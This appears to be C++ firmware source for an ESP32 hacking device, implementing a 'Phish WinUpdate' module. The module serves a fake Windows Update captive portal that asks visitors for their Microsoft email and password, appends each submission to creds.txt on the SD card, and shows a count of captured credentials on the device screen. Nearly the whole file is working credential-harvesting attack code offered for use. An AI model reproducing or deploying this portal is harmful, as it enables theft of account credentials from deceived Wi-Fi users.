#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <SD.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <globals.h>

static AsyncWebServer *phishServer = nullptr;

static const char WINUPDATE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>Windows Update</title>
<style>body{font-family:'Segoe UI',sans-serif;background:#0078d4;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.c{text-align:center;max-width:480px}h1{font-size:1.5rem;margin-bottom:24px}
.icon{font-size:4rem;margin-bottom:16px}
input{width:80%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px}
button{padding:12px 48px;border:none;background:#fff;color:#0078d4;font-weight:bold;border-radius:4px;cursor:pointer;margin-top:8px}
.msg{font-size:0.85rem;margin-top:24px;opacity:0.7}</style></head>
<body><div class="c"><div class="icon">&#128260;</div>
<h1>Update required to continue</h1>
<p>Please sign in with your Microsoft account</p>
<input type="email" placeholder="Email" name="email"><br>
<input type="password" placeholder="Password" name="pass"><br>
<button type="button" onclick="fetch('/submit',{method:'POST',body:JSON.stringify({e:document.querySelector('[name=email]').value,p:document.querySelector('[name=pass]').value})}).then(()=>this.textContent='Signed in')">Sign in</button>
<p class="msg">Your device needs this update for security.</p></div></body></html>
)rawliteral";

static int credsCaptured = 0;

static void setupPhishRoutes() {
    phishServer->on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send(200, "text/html", WINUPDATE_HTML);
    });
    phishServer->on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {},
        NULL,
        [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
            credsCaptured++;
            if (setupSdCard()) {
                if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
                File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
                if (f) {
                    String body = String((char *)data).substring(0, len);
                    f.println("[winupdate] " + body);
                    f.close();
                }
            }
            request->send(200, "application/json", "{\"ok\":true}");
        });
    phishServer->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *r = request->beginResponse(302);
        r->addHeader("Location", "http://192.168.4.1");
        request->send(r);
    });
    phishServer->onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("http://192.168.4.1");
    });
}

void arsenal_phish_windows_update(void) {
    ARSENAL_HEAP_CHECK();
    credsCaptured = 0;
    phishServer = new AsyncWebServer(80);
    setupPhishRoutes();
    phishServer->begin();

    drawMainBorderWithTitle("Phish WinUpdate");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 50);
    tft.print("Fake Windows Update portal");
    tft.setCursor(12, 66);
    tft.printf("Serving at %s", WiFi.softAPIP().toString().c_str());
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);

    while (true) {
        drawMainBorderWithTitle("Phish WinUpdate");
        int y = 45;
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, y);
        tft.printf("Clients: %d", WiFi.softAPgetStationNum());
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Creds: %d", credsCaptured);
        y += 14;
        tft.setCursor(12, y);
        tft.printf("IP: %s", WiFi.softAPIP().toString().c_str());
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);
        if (check(EscPress)) break;
        delay(200);
    }

    phishServer->end();
    delete phishServer;
    phishServer = nullptr;
}
